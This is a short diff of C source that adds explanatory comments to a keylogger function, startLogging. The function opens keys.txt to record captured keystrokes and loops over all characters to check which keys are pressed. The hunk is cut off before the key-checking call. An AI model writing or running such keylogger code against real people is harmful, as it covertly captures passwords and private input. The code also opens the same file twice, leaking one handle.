@@ -12,9 +12,12 @@ int main(){
 }
 
 void startLogging(){
+    // open a file to record the keystrokes being captured
     FILE *keysPtr;
     keysPtr = fopen("keys.txt", "w");
     keysPtr = fopen("keys.txt", "a");
+
+    // constantly loop through all the characters and check if they are currently being pressed or not
     char c;
     while(1){
         for (c = 0; c < 255; c++){
